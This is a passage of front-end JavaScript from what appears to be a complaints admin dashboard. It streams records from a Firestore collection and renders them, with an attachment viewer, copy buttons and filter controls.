        list.innerHTML = visible.length ? visible.map(cardHtml).join('') : emptyHtml();
      }

      function startFirestoreListener() {
        if (unsubscribe) unsubscribe();
        list.innerHTML = `
          <div class="empty" style="min-height:200px;">
            <div style="width:32px;height:32px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin 0.8s linear infinite;"></div>
            <p style="margin-top:12px; color:var(--muted);">Loading complaints from Firebase...</p>
          </div>
          <style>@keyframes spin{to{transform:rotate(360deg)}}</style>`;
        unsubscribe = db.collection('complains').orderBy('createdAt', 'desc').onSnapshot(
          (snapshot) => {
            allRows = snapshot.docs.map(doc => normalizeRow(doc.data())).filter(Boolean);
            render();
            console.log('[Firebase] Synced', allRows.length, 'complains');
          },
          (error) => {
            console.error('[Firebase] Error:', error);
            list.innerHTML = `
              <div class="empty">
                <div class="empty-icon" style="color:var(--red); border-color: rgba(255,107,111,0.3);">⚠️</div>
                <h2>Firebase Connection Error</h2>
                <p style="max-width:500px;">${escapeHtml(error.message)}<br><br>Check Firestore rules and ensure Firestore is enabled in Firebase Console.<br>Collection: <code>complains</code></p>
              </div>`;
          }
        );
      }

      function openViewer(row, key) {
        const file = row.files[key];
        if (!file) return;
        const src = fileSrc(file);
        const image = isImage(file);
        const title = labelFor(key);
        const size = formatSize(file.size);
        viewerTitle.textContent = title;
        viewerMeta.textContent = [file.name || 'Attachment', size].filter(Boolean).join(' • ');
        viewerImg.onerror = () => {
          viewerImg.hidden = true;
          viewerFallback.hidden = false;
        };
        if (image && src) {
          viewerImg.hidden = false;
          viewerImg.src = src;
          viewerImg.alt = file.name || title;
          viewerFallback.hidden = true;
        } else {
          viewerImg.hidden = true;
          viewerImg.removeAttribute('src');
          viewerFallback.hidden = false;
        }
        if (src) {
          downloadBtn.href = src;
          downloadBtn.download = file.name || 'attachment';
          downloadBtn.classList.remove('disabled');
          downloadBtn.removeAttribute('aria-disabled');
        } else {
          downloadBtn.removeAttribute('href');
          downloadBtn.classList.add('disabled');
          downloadBtn.setAttribute('aria-disabled', 'true');
        }
        viewer.hidden = false;
        document.body.classList.add('viewer-open');
        requestAnimationFrame(() => viewer.classList.add('open'));
        viewerClose.focus();
      }

      function closeViewer() {
        viewer.classList.remove('open');
        viewer.hidden = true;
        viewerImg.removeAttribute('src');
        viewerImg.hidden = false;
        viewerFallback.hidden = true;
        document.body.classList.remove('viewer-open');
      }

      list.addEventListener('click', (event) => {
        const button = event.target.closest('.view-btn');
        if (!button) return;
        const id = button.getAttribute('data-id');
        const key = button.getAttribute('data-key');
        const row = allRows.find((item) => item.id === id);
        if (row) openViewer(row, key);
      });

      list.addEventListener('click', async (event) => {
        const btn = event.target.closest('.copy-btn');
        if (!btn) return;
        const text = btn.getAttribute('data-copy') || '';
        if (!text) return;
        try {
          await navigator.clipboard.writeText(text);
        } catch {
          const ta = document.createElement('textarea');
          ta.value = text;
          document.body.appendChild(ta);
          ta.select();
          document.execCommand('copy');
          ta.remove();
        }
        const orig = btn.innerHTML;
        btn.classList.add('copied');
        btn.innerHTML = tickIconSvg();
        showToast('Copied: ' + text.slice(0, 30) + (text.length > 30 ? '…' : ''));
        setTimeout(() => {
          btn.classList.remove('copied');
          btn.innerHTML = orig;
        }, 1200);
      });

      todayBtn.addEventListener('click', () => setFilter('today'));
      allBtn.addEventListener('click', () => setFilter('all'));

      viewerClose.addEventListener('click', closeViewer);
      closeBtn.addEventListener('click', closeViewer);
      viewer.addEventListener('click', (event) => {
        if (event.target === viewer) closeViewer();
      });

      downloadBtn.addEventListener('click', (event) => {
        if (!downloadBtn.getAttribute('href')) event.preventDefault();
      });

      document.addEventListener('keydown', (event) => {
        if (event.key === 'Escape' && !viewer.hidden) closeViewer();
      });

      // No lock - directly load data
      startFirestoreListener();
    })();
  </script>
</body>
</html>
